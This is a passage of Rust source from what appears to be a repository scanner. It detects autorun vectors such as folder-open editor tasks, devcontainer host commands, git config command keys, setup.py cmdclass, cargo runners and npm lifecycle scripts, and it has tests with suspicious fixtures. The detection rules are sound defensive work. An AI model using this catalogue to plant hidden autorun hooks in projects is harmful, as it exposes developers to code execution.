            Some(Severity::High)
        }
        _ => Some(Severity::Medium),
    }
}

/// The rules of an editor settings object (`.vscode/settings.json`, or the `settings` block of a
/// workspace file).
fn settings_from(cx: &mut Cx, o: &Map) {
    let text = cx.text;
    let base = workspace_base(cx.path);
    let mut worst: Option<(Severity, &str, String)> = None;
    for (key, value) in o.iter().filter(|(k, _)| is_program_key(k)).take(200) {
        for (shown, program) in program_values(key, value) {
            let Some(sev) = program_value_severity(&program, base) else {
                continue;
            };
            if worst.as_ref().is_none_or(|(s, _, _)| sev > *s) {
                worst = Some((sev, key, format!("{shown} = {program}")));
            }
        }
    }
    if let Some((severity, key, seen)) = worst {
        let why = if severity == Severity::High {
            "An editor setting names a program inside the repo, so the editor or an extension \
             runs code the repo supplies as soon as the folder opens."
        } else {
            "An editor setting names a program outside the repo for the editor or an extension \
             to run."
        };
        cx.find(
            severity,
            "autorun.vscode-program",
            key_line(text, 0, key),
            why,
            &seen,
            READ_FIRST,
        );
    }
    let hides = o
        .get("files.exclude")
        .and_then(Value::as_object)
        .is_some_and(|ex| {
            ex.iter()
                .any(|(k, val)| hides_vscode(k) && val.as_bool() != Some(false))
        });
    if hides {
        cx.find(
            Severity::High,
            "autorun.vscode-hidden",
            key_line(text, 0, "files.exclude"),
            "The editor settings hide the .vscode folder from the file tree, so the tasks \
             inside it cannot be seen.",
            "files.exclude",
            READ_FIRST,
        );
    }
    if let Some((key, _)) = o
        .iter()
        .find(|(k, _)| k.starts_with("terminal.integrated.env."))
    {
        cx.find(
            Severity::Medium,
            "autorun.vscode-env",
            key_line(text, 0, key),
            "The editor settings set environment variables for every integrated terminal, \
             which can change what the commands you run there do.",
            key,
            READ_FIRST,
        );
    }
}

// Devcontainer

fn devcontainer(cx: &mut Cx) {
    let text = cx.text;
    let v = match jsonc::parse(text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Devcontainer),
    };
    let Some(o) = v.as_object() else {
        return;
    };
    let dir = if base(cx.path).eq_ignore_ascii_case(".devcontainer.json") {
        parent(cx.path)
    } else {
        dir_above(cx.path, ".devcontainer").unwrap_or("")
    }
    .to_string();
    if let Some(init) = o.get("initializeCommand") {
        let line = key_line(text, 0, "initializeCommand");
        for command in command_values(init) {
            cx.surface(
                "autorun.devcontainer-host",
                Trigger::Open,
                &command,
                line,
                &dir,
                Severity::Info,
            );
        }
    }
    let flat = |key: &str| o.get(key).map(|v| format!("{v:?}")).unwrap_or_default();
    let run_args = flat("runArgs");
    let mut reasons: Vec<&str> = Vec::new();
    if o.get("privileged").and_then(Value::as_bool) == Some(true)
        || run_args.contains("--privileged")
    {
        reasons.push("runs privileged");
    }
    if ["mounts", "workspaceMount", "runArgs"]
        .iter()
        .any(|k| flat(k).contains("docker.sock"))
    {
        reasons.push("mounts the Docker socket");
    }
    let cap_admin = o.get("capAdd").and_then(Value::as_array).is_some_and(|a| {
        a.iter()
            .filter_map(Value::as_str)
            .any(|c| c.eq_ignore_ascii_case("SYS_ADMIN"))
    });
    if cap_admin || run_args.to_ascii_uppercase().contains("SYS_ADMIN") {
        reasons.push("adds the SYS_ADMIN capability");
    }
    if !reasons.is_empty() {
        let line = [
            "privileged",
            "mounts",
            "workspaceMount",
            "capAdd",
            "runArgs",
        ]
        .iter()
        .map(|k| key_line(text, 0, k))
        .filter(|l| *l > 0)
        .min()
        .unwrap_or(0);
        cx.find(
            Severity::Medium,
            "autorun.devcontainer-privileged",
            line,
            &format!(
                "The container {}, which gives code inside it a way to reach the host.",
                reasons.join(" and ")
            ),
            &reasons.join("; "),
            READ_FIRST,
        );
    }
}

/// The commands a lifecycle value holds: a string, an argument array, or an object of either.
/// An object nested deeper is not read.
fn command_values(v: &Value) -> Vec<String> {
    match v {
        Value::Object(o) => o.iter().flat_map(|(_, v)| command_value(v)).collect(),
        other => command_value(other),
    }
}

fn command_value(v: &Value) -> Vec<String> {
    match v {
        Value::Str(s) => vec![s.clone()],
        Value::Array(items) => {
            let words: Vec<String> = items
                .iter()
                .filter_map(|i| i.as_str().map(str::to_string))
                .collect();
            if words.len() == items.len() && !words.is_empty() {
                vec![join_args(&words)]
            } else {
                Vec::new()
            }
        }
        _ => Vec::new(),
    }
}

// Build files and recipe files

/// Makefile, `*.mk`, `*.m4` and `configure`: the lines that download and run, or decode and run.
fn build_script(cx: &mut Cx) {
    let dir = parent(cx.path).to_string();
    let dnl = ends_with_ci(base(cx.path), ".m4");
    for l in logical_lines(cx.text, dnl) {
        if matches!(
            shape::classify(&l.text),
            Shape::FetchExec | Shape::DecodeExec
        ) {
            cx.surface(
                "autorun.build-script",
                Trigger::Build,
                &l.text,
                l.line,
                &dir,
                Severity::Info,
            );
        }
    }
}

/// `.envrc`, a husky hook or a Justfile: every command line is an opt-in surface. A Justfile
/// (`recipes_only`) counts only the indented lines, which are the recipe bodies.
fn shell_surfaces(cx: &mut Cx, rule: &'static str, recipes_only: bool) {
    let dir = match dir_above(cx.path, ".husky") {
        Some(root) => root.to_string(),
        None => parent(cx.path).to_string(),
    };
    for l in logical_lines(cx.text, false) {
        if !recipes_only || l.indented {
            cx.surface(rule, Trigger::OptIn, &l.text, l.line, &dir, Severity::Info);
        }
    }
}

/// `entry:` of a hook with `language: system`, which runs a program of the machine on commit.
fn pre_commit(cx: &mut Cx) {
    let lines: Vec<&str> = cx.text.lines().collect();
    let dir = parent(cx.path).to_string();
    for (i, raw) in lines.iter().enumerate() {
        let t = raw.trim_start();
        let Some(after) = t.strip_prefix('-') else {
            continue;
        };
        if !after.is_empty() && !after.starts_with(' ') {
            continue;
        }
        let dash = raw.len() - t.len();
        let first = after.trim_start();
        let key_indent = dash + 1 + (after.len() - first.len());
        let mut keys: Vec<(usize, &str, String)> = Vec::new();
        if let Some((k, v)) = yaml_kv(first) {
            keys.push((i + 1, k, v));
        }
        for (j, l) in lines.iter().enumerate().skip(i + 1).take(200) {
            let c = l.trim_start();
            if c.is_empty() || c.starts_with('#') {
                continue;
            }
            let indent = l.len() - c.len();
            if indent <= dash {
                break;
            }
            if indent == key_indent
                && let Some((k, v)) = yaml_kv(c)
            {
                keys.push((j + 1, k, v));
            }
        }
        let system = keys
            .iter()
            .any(|(_, k, v)| *k == "language" && matches!(v.as_str(), "system" | "unsupported"));
        let entry = keys.iter().find(|(_, k, _)| *k == "entry");
        if system
            && let Some((line, _, value)) = entry
            && !is_block(value)
        {
            cx.surface(
                "autorun.pre-commit-hook",
                Trigger::OptIn,
                value,
                *line,
                &dir,
                Severity::Info,
            );
        }
    }
}

/// `cmd:` values and the plain string items of `cmds:` in a Taskfile.
fn taskfile(cx: &mut Cx) {
    let lines: Vec<&str> = cx.text.lines().collect();
    let dir = parent(cx.path).to_string();
    let add = |cx: &mut Cx, line: usize, command: &str| {
        cx.surface(
            "autorun.taskfile",
            Trigger::OptIn,
            command,
            line,
            &dir,
            Severity::Info,
        );
    };
    for (i, raw) in lines.iter().enumerate() {
        let t = raw.trim_start();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let indent = raw.len() - t.len();
        let inner = t.strip_prefix("- ").map_or(t, str::trim_start);
        let Some((key, value)) = yaml_kv(inner) else {
            continue;
        };
        if key == "cmd" {
            if is_block(&value) {
                for (line, body) in block_lines(&lines, i, indent) {
                    add(cx, line, &body);
                }
            } else {
                add(cx, i + 1, &value);
            }
        } else if key == "cmds" && value.is_empty() && !t.starts_with('-') {
            let mut item_indent = None;
            for (j, l) in lines.iter().enumerate().skip(i + 1) {
                let c = l.trim_start();
                if c.is_empty() || c.starts_with('#') {
                    continue;
                }
                let ind = l.len() - c.len();
                if ind < indent || (ind == indent && !c.starts_with("- ")) {
                    break;
                }
                let Some(item) = c.strip_prefix("- ") else {
                    continue;
                };
                if *item_indent.get_or_insert(ind) != ind {
                    continue;
                }
                let item = item.trim_start();
                if yaml_kv(item).is_some_and(|(k, _)| is_identifier(k)) {
                    continue;
                }
                let scalar = yaml_scalar(item);
                if is_block(&scalar) {
                    for (line, body) in block_lines(&lines, j, ind) {
                        add(cx, line, &body);
                    }
                } else {
                    add(cx, j + 1, &scalar);
                }
            }
        }
    }
    cx.found.sort_by_key(|s| s.line);
}

fn is_identifier(key: &str) -> bool {
    let mut chars = key.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

static MSBUILD_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)<Exec\b(?:[^>"']|"[^"]*"|'[^']*')*?\bCommand\s*=\s*(?:"([^"]*)"|'([^']*)')"#)
        .expect("pattern compiles")
});

static MSBUILD_EVENT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?is)<(?:Pre|Post)BuildEvent\b[^>]*>(.*?)</(?:Pre|Post)BuildEvent>")
        .expect("pattern compiles")
});

static XML_ENTITY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"&(#[xX][0-9a-fA-F]+|#[0-9]+|amp|lt|gt|quot|apos);").expect("pattern compiles")
});

fn xml_decode(s: &str) -> String {
    XML_ENTITY
        .replace_all(s, |c: &Captures| {
            let entity = &c[1];
            let decoded = match entity {
                "amp" => Some('&'),
                "lt" => Some('<'),
                "gt" => Some('>'),
                "quot" => Some('"'),
                "apos" => Some('\''),
                _ => {
                    let number = match entity.strip_prefix(['#']) {
                        Some(n) => match n.strip_prefix(['x', 'X']) {
                            Some(hex) => u32::from_str_radix(hex, 16).ok(),
                            None => n.parse().ok(),
                        },
                        None => None,
                    };
                    number.and_then(char::from_u32)
                }
            };
            decoded.map_or_else(|| c[0].to_string(), |ch| ch.to_string())
        })
        .into_owned()
}

/// `<Exec Command=…>`, `<PreBuildEvent>` and `<PostBuildEvent>` of an MSBuild file.
fn msbuild(cx: &mut Cx) {
    let text = cx.text;
    let dir = parent(cx.path).to_string();
    // Each command with the byte offset where it starts, then in source order.
    let mut commands: Vec<(usize, String)> = Vec::new();
    for c in MSBUILD_EXEC.captures_iter(text) {
        let Some(m) = c.get(1).or_else(|| c.get(2)) else {
            continue;
        };
        let at = c.get(0).map_or(0, |w| w.start());
        commands.push((at, xml_decode(m.as_str())));
    }
    for c in MSBUILD_EVENT.captures_iter(text) {
        let Some(m) = c.get(1) else {
            continue;
        };
        let mut at = m.start();
        for raw in m.as_str().split('\n') {
            commands.push((at, xml_decode(raw)));
            at += raw.len() + 1;
        }
    }
    commands.sort_by_key(|(at, _)| *at);
    // One pass over the text for every line number.
    let (mut line, mut pos) = (1, 0);
    for (at, command) in commands {
        line += text.as_bytes()[pos..at]
            .iter()
            .filter(|b| **b == b'\n')
            .count();
        pos = at;
        cx.surface(
            "autorun.msbuild-exec",
            Trigger::Build,
            &command,
            line,
            &dir,
            Severity::Info,
        );
    }
}

// Python and Rust build hooks

static CMDCLASS_OPEN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bcmdclass\s*=\s*(\{|dict\s*\()").expect("pattern compiles"));

static CMDCLASS_KEY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"["']?\b(?:install|develop|egg_info)\b["']?\s*[:=]"#).expect("pattern compiles")
});

static CMDCLASS_ITEM: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\bcmdclass\s*\[\s*["'](?:install|develop|egg_info)["']\s*\]"#)
        .expect("pattern compiles")
});

/// The text of the bracket pair that opens at `open` (a `{` or `(`), cut at 4,000 bytes.
fn bracket_window(text: &str, open: usize) -> &str {
    let mut depth = 0usize;
    for (i, b) in text.bytes().enumerate().skip(open).take(4000) {
        match b {
            b'{' | b'(' => depth += 1,
            b'}' | b')' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return &text[open..=i];
                }
            }
            _ => {}
        }
    }
    let end = (open + 4000).min(text.len());
    let end = (open..=end)
        .rev()
        .find(|e| text.is_char_boundary(*e))
        .unwrap_or(open);
    &text[open..end]
}

fn setup_py(cx: &mut Cx) {
    let text = cx.text;
    // setup.py runs on every install, with or without a cmdclass, so it is always a surface: the
    // orchestrator raises it when a file it runs, or setup.py itself, holds a HIGH finding.
    let dir = parent(cx.path).to_string();
    cx.surface(
        "autorun.setup-py",
        Trigger::Install,
        "python setup.py",
        1,
        &dir,
        Severity::Info,
    );
    let mut hit: Option<usize> = CMDCLASS_ITEM.find(text).map(|m| m.start());
    for c in CMDCLASS_OPEN.captures_iter(text).take(100) {
        let (Some(whole), Some(open)) = (c.get(0), c.get(1)) else {
            continue;
        };
        // `dict(` ends at its `)`; `{` at its `}`: both start at the bracket itself.
        let bracket = open.end() - 1;
        if CMDCLASS_KEY.is_match(bracket_window(text, bracket)) {
            hit = Some(hit.map_or(whole.start(), |h| h.min(whole.start())));
        }
    }
    if let Some(at) = hit {
        cx.find(
            Severity::Medium,
            "autorun.setup-py-cmdclass",
            line_at(text, at),
            "setup.py replaces the install, develop or egg_info command, so its own code runs \
             when someone installs the package.",
            "cmdclass",
            READ_FIRST,
        );
    }
}

fn pyproject(cx: &mut Cx) {
    let hit = tomlish::entries(cx.text)
        .into_iter()
        .find(|e| &*e.table == "build-system" && e.key == "backend-path");
    if let Some(e) = hit {
        cx.find(
            Severity::Medium,
            "autorun.pyproject-backend-path",
            e.line,
            "The build backend is loaded from a folder of this repo, so its code runs when \
             the package is built or installed.",
            &format!("backend-path = {}", e.value),
            READ_FIRST,
        );
    }
}

/// HIGH for a program given as a path (it is a file of the repo), MEDIUM for a bare name that
/// PATH resolves (sccache, probe-rs, wasmtime). The program is the first word of a string, or the
/// first item of an array.
fn program_severity(value: &str) -> Severity {
    let v = value.trim().trim_start_matches('[').trim_start();
    let first = v
        .trim_start_matches(['"', '\''])
        .split(['"', '\'', ' ', ',', '\t'])
        .next()
        .unwrap_or("");
    if first.is_empty() || first.contains(['/', '\\']) || first.starts_with(['.', '$']) {
        Severity::High
    } else {
        Severity::Medium
    }
}

fn cargo_config(cx: &mut Cx) {
    let mut strongest: Option<(Severity, usize, String)> = None;
    let mut reasons: Vec<&str> = Vec::new();
    for e in tomlish::entries(cx.text) {
        if e.table.len() > 256 || e.key.len() > 256 {
            continue;
        }
        let at = if e.table.is_empty() {
            e.key.clone()
        } else {
            format!("{}.{}", e.table, e.key)
        };
        let (severity, why) = if matches!(
            at.as_str(),
            "build.rustc" | "build.rustc-wrapper" | "build.rustc-workspace-wrapper"
        ) || (at.starts_with("target.") && at.ends_with(".runner"))
        {
            (
                program_severity(&e.value),
                "names a program that cargo runs in place of rustc or the tests",
            )
        } else if at == "env" || at.starts_with("env.") {
            (
                Severity::Medium,
                "sets environment variables for every cargo run",
            )
        } else if at.starts_with("source.") {
            (Severity::Medium, "replaces where cargo fetches crates from")
        } else {
            continue;
        };
        if !reasons.contains(&why) {
            reasons.push(why);
        }
        if strongest.as_ref().is_none_or(|(s, _, _)| severity > *s) {
            strongest = Some((severity, e.line, format!("{at} = {}", e.value)));
        }
    }
    if let Some((severity, line, seen)) = strongest {
        cx.find(
            severity,
            "autorun.cargo-config",
            line,
            &format!("This cargo config {}.", reasons.join(", and ")),
            &seen,
            READ_FIRST,
        );
    }
}

fn rust_toolchain(cx: &mut Cx) {
    let hit = tomlish::entries(cx.text)
        .into_iter()
        .find(|e| &*e.table == "toolchain" && e.key == "path");
    if let Some(e) = hit {
        cx.find(
            Severity::High,
            "autorun.rust-toolchain-path",
            e.line,
            "The toolchain is a folder of this repo, so rustup runs a compiler the repo ships.",
            &format!("path = {}", e.value),
            READ_FIRST,
        );
    }
}

// Wrappers that download a tool

/// A wrapper properties file whose download URL (any of `keys`) is not on `official`. One finding.
fn wrapper_properties(cx: &mut Cx, rule: &str, keys: &[&str], official: &str) {
    for e in ini_entries(cx.text, false) {
        if !keys.contains(&e.key.as_str()) {
            continue;
        }
        let url = e.value.replace("\\:", ":").replace("\\=", "=");
        if url_host(&url) != official {
            cx.find(
                Severity::High,
                rule,
                e.line,
                &format!(
                    "The wrapper downloads its tool from a host other than {official}, and \
                     runs what it gets."
                ),
                &format!("{} = {}", e.key, e.value),
                READ_FIRST,
            );
            return;
        }
    }
}

// Git files

fn gitmodules(cx: &mut Cx) {
    let entries = ini_entries(cx.text, true);
    let in_submodule = |e: &&Ini| {
        e.section
            .as_bytes()
            .get(..9)
            .is_some_and(|b| b.eq_ignore_ascii_case(b"submodule"))
    };
    // The entries of one section share an `Rc`, so a pointer says when a new section starts.
    let mut submodules = 0;
    let mut last: Option<&Rc<str>> = None;
    for e in entries.iter().filter(in_submodule) {
        if last.is_none_or(|l| !Rc::ptr_eq(l, &e.section)) {
            submodules += 1;
            last = Some(&e.section);
        }
    }
    if submodules == 0 {
        return;
    }
    let mut reasons: Vec<&str> = Vec::new();
    let mut first: Option<(usize, String)> = None;
    for e in entries.iter().filter(in_submodule) {
        let reason = match e.key.as_str() {
            "path" if e.value.contains('\r') => "a path holds a carriage return",
            "path" if e.value.split(['/', '\\']).any(|p| p == "..") => "a path climbs out with ..",
            "url" if !url_is_https_or_ssh(unquote(&e.value)) => "a URL is not https or ssh",
            _ => continue,
        };
        if !reasons.contains(&reason) {
            reasons.push(reason);
        }
        first.get_or_insert((e.line, format!("{} = {}", e.key, e.value)));
    }
    match first {
        Some((line, seen)) => cx.find(
            Severity::High,
            "autorun.gitmodules",
            line,
            &format!(
                "A submodule entry is built to write outside its folder or to reach git by an \
                 unusual door: {}.",
                reasons.join("; ")
            ),
            &seen,
            "Do not clone this repo with --recurse-submodules or update its submodules.",
        ),
        None => cx.find(
            Severity::Info,
            "autorun.gitmodules",
            0,
            &format!("The repo lists {submodules} submodule(s)."),
            "",
            "Submodules are fetched from other repos; check each one before you update.",
        ),
    }
}

fn url_is_https_or_ssh(url: &str) -> bool {
    static SCP_LIKE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^[A-Za-z0-9._-]+@[A-Za-z0-9.-]+:").expect("pattern compiles")
    });
    let lower = url.to_ascii_lowercase();
    // A relative URL is read against the remote of the repo itself.
    ["https://", "ssh://", "./", "../"]
        .iter()
        .any(|p| lower.starts_with(p))
        || SCP_LIKE.is_match(url)
}

fn gitattributes(cx: &mut Cx) {
    let mut names: Vec<&str> = Vec::new();
    let mut first = 0;
    for (i, raw) in cx.text.lines().enumerate() {
        let t = raw.trim();
        if t.starts_with('#') {
            continue;
        }
        for name in t
            .split_whitespace()
            .skip(1)
            .filter_map(|tok| tok.strip_prefix("filter="))
            .filter(|n| !n.is_empty())
        {
            if names.is_empty() {
                first = i + 1;
            }
            if !names.contains(&name) {
                names.push(name);
            }
        }
    }
    if !names.is_empty() {
        let seen = names.join(" ");
        cx.find(
            Severity::Low,
            "autorun.gitattributes-filter",
            first,
            "A filter attribute runs the command a user configured for it whenever git checks \
             files in or out; this repo does not set one up by itself.",
            &seen,
            "Do not configure these filters from instructions in the repo.",
        );
    }
}

fn is_git_bool(v: &str) -> bool {
    matches!(
        v.to_ascii_lowercase().as_str(),
        "" | "true" | "false" | "yes" | "no" | "on" | "off" | "0" | "1"
    )
}

/// `.git/config` as it came in the tree: settings that make git run a command.
fn git_config(cx: &mut Cx) {
    // The strongest hit of each rule: level, line and what was seen.
    let mut command: Option<(Severity, usize, String)> = None;
    let mut include: Option<(usize, String)> = None;
    // The name of the current section, worked out once per section: a header can be huge.
    let mut current: Option<(Rc<str>, String)> = None;
    for e in ini_entries(cx.text, true) {
        if current
            .as_ref()
            .is_none_or(|(s, _)| !Rc::ptr_eq(s, &e.section))
        {
            // The section's own name is short; a long one cannot be a name git reads. It ends at
            // a space (`[filter "x"]`) or a dot (`[filter.x]`).
            let name = e
                .section
                .split([' ', '\t', '.'])
                .next()
                .filter(|w| w.len() <= 16)
                .unwrap_or("")
                .to_ascii_lowercase();
            current = Some((Rc::clone(&e.section), name));
        }
        let name = current.as_ref().map_or("", |(_, n)| n.as_str());
        let key = e.key.to_ascii_lowercase();
        let value = unquote(&e.value);
        let seen = || format!("{}.{} = {}", name, e.key, e.value);
        let level = match (name, key.as_str()) {
            ("include" | "includeif", "path") => {
                include.get_or_insert((e.line, seen()));
                continue;
            }
            ("core", "fsmonitor") => (!is_git_bool(value)).then_some(Severity::High),
            // husky points the hooks path at its own folder; its hooks are rated as files.
            ("core", "hookspath") if matches!(value, ".husky" | ".husky/_") => Some(Severity::Low),
            (
                "core",
                "sshcommand"
                | "pager"
                | "editor"
                | "hookspath"
                | "askpass"
                | "gitproxy"
                | "alternaterefscommand",
            )
            | ("filter", "clean" | "smudge" | "process")
            | ("diff", "textconv" | "external" | "command")
            | ("merge", "driver")
            | ("sequence", "editor")
            | ("gpg", "program" | "defaultkeycommand")
            | ("interactive", "difffilter")
            | ("difftool" | "mergetool" | "browser" | "man" | "trailer", "cmd")
            | ("trailer", "command")
            | ("web", "browser")
            | ("remote", "uploadpack" | "receivepack") => Some(Severity::High),
            // `pager.<command>` is a program, or a boolean that turns the pager on or off.
            ("pager", _) => (!is_git_bool(value)).then_some(Severity::High),
            ("credential", "helper") => {
                let first = value.split_whitespace().next().unwrap_or("");
                (!SAFE_CREDENTIAL_HELPERS.contains(&first)).then_some(Severity::High)
            }
            ("alias", _) | ("submodule", "update") => {
                value.starts_with('!').then_some(Severity::High)
            }
            _ => None,
        };
        if let Some(level) = level
            && command.as_ref().is_none_or(|(s, _, _)| level > *s)
        {
            command = Some((level, e.line, seen()));
        }
    }
    if let Some((severity, line, seen)) = command {
        let why = if severity == Severity::Low {
            "The git config points the hooks path at the folder husky installs its hooks in; \
             the hooks there are listed as files."
        } else {
            "The git config in the repo's .git folder names a command that git runs on \
             ordinary commands such as status, diff and checkout."
        };
        cx.find(
            severity,
            "autorun.git-config-command",
            line,
            why,
            &seen,
            "Do not run git in this folder. Read the git config first.",
        );
    }
    if let Some((line, seen)) = include {
        cx.find(
            Severity::High,
            "autorun.git-config-include",
            line,
            "The git config pulls in another file, which can set any of the commands git runs. \
             A fresh clone has no include.",
            &seen,
            "Do not run git in this folder. Read the included file first.",
        );
    }
}

/// Credential helpers git ships or the platforms install.
const SAFE_CREDENTIAL_HELPERS: &[&str] = &[
    "",
    "cache",
    "store",
    "osxkeychain",
    "manager",
    "manager-core",
    "libsecret",
    "wincred",
    "gnome-keyring",
    "netrc",
];

// Package manager settings

fn npmrc(cx: &mut Cx) {
    let mut hits: Vec<(usize, String)> = Vec::new();
    for e in ini_entries(cx.text, false) {
        let key = e.key.to_ascii_lowercase();
        let value = unquote(&e.value);
        let flagged = match key.as_str() {
            "ignore-scripts" => value.eq_ignore_ascii_case("false"),
            "script-shell" | "node-options" => !value.is_empty(),
            k if k == "registry" || k.ends_with(":registry") => {
                !value.is_empty() && url_host(value) != "registry.npmjs.org"
            }
            _ => false,
        };
        if flagged {
            hits.push((e.line, format!("{} = {}", e.key, e.value)));
        }
    }
    if let Some((line, seen)) = hits.first() {
        let keys: Vec<&str> = hits
            .iter()
            .filter_map(|(_, s)| s.split(" = ").next())
            .collect();
        cx.find(
            Severity::Medium,
            "autorun.npmrc",
            *line,
            &format!(
                "This .npmrc changes what npm runs or where it downloads from: {}.",
                keys.join(", ")
            ),
            seen,
            READ_FIRST,
        );
    }
}

/// `yarnPath` of `.yarnrc.yml` or `yarn-path` of `.yarnrc`: Yarn runs that file instead of its own.
fn yarn_path(cx: &mut Cx) {
    let yml = base(cx.path).eq_ignore_ascii_case(".yarnrc.yml");
    for (i, raw) in cx.text.lines().enumerate() {
        let t = raw.trim();
        let value = if yml {
            yaml_kv(t).filter(|(k, _)| *k == "yarnPath").map(|(_, v)| v)
        } else {
            t.strip_prefix("yarn-path")
                .filter(|r| r.starts_with([' ', '\t', ':', '=']))
                .map(|r| yaml_scalar(r.trim_start_matches([' ', '\t', ':', '='])))
        };
        let Some(value) = value.filter(|v| !v.is_empty()) else {
            continue;
        };
        if !is_under_releases(&value) {
            cx.find(
                Severity::High,
                "autorun.yarn-path",
                i + 1,
                "Yarn is pointed at a script outside .yarn/releases, and runs that script on \
                 every yarn command.",
                &value,
                READ_FIRST,
            );
            return;
        }
    }
}

/// True when `path`, with `.` and `..` resolved, stays inside `.yarn/releases/`.
fn is_under_releases(path: &str) -> bool {
    let path = path.replace('\\', "/");
    if path.starts_with('/') || path.as_bytes().get(1) == Some(&b':') {
        return false;
    }
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                if parts.pop().is_none() {
                    return false;
                }
            }
            p => parts.push(p),
        }
    }
    parts.len() > 2 && parts[0] == ".yarn" && parts[1] == "releases"
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shape;
    use crate::{FileKind, Group, Severity, Trigger};

    fn ctx<'a>(path: &'a str, text: &'a str) -> FileCtx<'a> {
        FileCtx {
            path,
            bytes: text.as_bytes(),
            text: Some(text),
            kind: FileKind::Config,
            truncated: false,
        }
    }

    fn run(path: &str, text: &str) -> (Vec<Surface>, Vec<Finding>) {
        let mut out = Vec::new();
        let found = surfaces(&ctx(path, text), &mut out);
        (found, out)
    }

    fn commands(s: &[Surface]) -> Vec<&str> {
        s.iter().map(|x| x.command.as_str()).collect()
    }

    fn lines(s: &[Surface]) -> Vec<usize> {
        s.iter().map(|x| x.line).collect()
    }

    fn rules(out: &[Finding]) -> Vec<&str> {
        out.iter().map(|f| f.rule.as_str()).collect()
    }

    fn named<'a>(out: &'a [Finding], rule: &str) -> &'a Finding {
        out.iter()
            .find(|f| f.rule == rule)
            .unwrap_or_else(|| panic!("no {rule} in {:?}", rules(out)))
    }

    /// Every surface has this rule, trigger and floor.
    fn all_are(s: &[Surface], rule: &str, trigger: Trigger, floor: Severity) {
        assert!(!s.is_empty(), "no surfaces");
        for x in s {
            assert_eq!(
                (x.rule, x.trigger, x.floor),
                (rule, trigger, floor),
                "{x:?}"
            );
        }
    }

    // package.json

    const LIFECYCLE: &str = r#"{
  "name": "x",
  "scripts": {
    "build": "tsc",
    "preinstall": "node pre.js",
    "install": "node-gyp rebuild",
    "postinstall": "node post.js"
  }
}"#;

    #[test]
    fn npm_install_lifecycle_scripts_are_install_surfaces() {
        let (s, out) = run("package.json", LIFECYCLE);
        assert_eq!(
            commands(&s),
            ["node pre.js", "node-gyp rebuild", "node post.js"]
        );
        all_are(
            &s,
            "autorun.npm-lifecycle",
            Trigger::Install,
            Severity::Info,
        );
        assert_eq!(lines(&s), [5, 6, 7]);
        assert!(
            s.iter()
                .all(|x| x.path == "package.json" && x.dir.is_empty())
        );
        // One INFO inventory finding for the file, nothing else.
        assert_eq!(rules(&out), ["autorun.inventory"]);
        let inv = &out[0];
        assert_eq!(
            (inv.severity, inv.group, inv.line, inv.count),
            (Severity::Info, Group::Autorun, 0, 3)
        );
        assert_eq!(inv.path, "package.json");
    }

    #[test]
    fn npm_prepare_prepublish_and_prepack_are_build_surfaces() {
        let (s, _) = run(
            "package.json",
            r#"{"scripts":{"prepare":"husky install","prepublish":"npm run build","prepack":"node pack.js","prepublishOnly":"node x.js"}}"#,
        );
        assert_eq!(
            commands(&s),
            ["husky install", "npm run build", "node pack.js"]
        );
        all_are(&s, "autorun.npm-lifecycle", Trigger::Build, Severity::Info);
    }

    #[test]
    fn npm_ordinary_scripts_are_not_surfaces() {
        let (s, out) = run(
            "package.json",
            r#"{"scripts":{"build":"tsc","test":"jest","lint":"eslint .","start":"node server.js","dev":"vite","pretest":"node a.js","postbuild":"node b.js"}}"#,
        );
        assert!(s.is_empty(), "{s:?}");
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn npm_start_that_runs_a_data_file_is_a_high_floor_surface() {
        let (s, _) = run(
            "package.json",
            r#"{"scripts":{"start":"node public/fonts/a.woff2","dev":"npm run serve","serve":"node assets/logo.png"}}"#,
        );
        assert_eq!(commands(&s), ["node public/fonts/a.woff2", "npm run serve"]);
        all_are(&s, "autorun.npm-start-data", Trigger::OptIn, Severity::High);
    }

    #[test]
    fn package_json_at_depth_names_its_folder_and_node_modules_is_skipped() {
        let (s, _) = run("packages/a/package.json", LIFECYCLE);
        assert!(s.iter().all(|x| x.dir == "packages/a"), "{s:?}");
        for path in [
            "node_modules/x/package.json",
            "a/node_modules/x/package.json",
        ] {
            let (s, out) = run(path, LIFECYCLE);
            assert!(s.is_empty() && out.is_empty(), "{path}");
        }
    }

    #[test]
    fn package_json_that_is_not_json_is_high() {
        let (s, out) = run("package.json", r#"{"scripts": {"postinstall": "#);
        assert!(s.is_empty());
        assert_eq!(rules(&out), ["autorun.unparsed"]);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn npm_scripts_lists_names_and_commands() {
        let f = ctx(
            "package.json",
            r#"{"scripts":{"build":"tsc","n":3,"postinstall":"node a.js"}}"#,
        );
        assert_eq!(
            npm_scripts(&f),
            [
                ("build".to_string(), "tsc".to_string()),
                ("postinstall".to_string(), "node a.js".to_string())
            ]
        );
        assert!(npm_scripts(&ctx("package.json", r#"{"name":"x"}"#)).is_empty());
        assert!(npm_scripts(&ctx("package.json", "not json")).is_empty());
    }

    // .vscode/tasks.json and .cursor/tasks.json

    const TASKS: &str = r#"{
  // runs when the folder opens
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "node",
      "args": ["scripts/setup.js", "--quiet"],
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "never", "echo": false },
    },
    { "label": "build", "type": "shell", "command": "make" }
  ]
}"#;

    #[test]
    fn a_folder_open_task_is_an_open_surface() {
        let (s, out) = run(".vscode/tasks.json", TASKS);
        assert_eq!(commands(&s), ["node scripts/setup.js --quiet"]);
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
        assert_eq!(s[0].path, ".vscode/tasks.json");
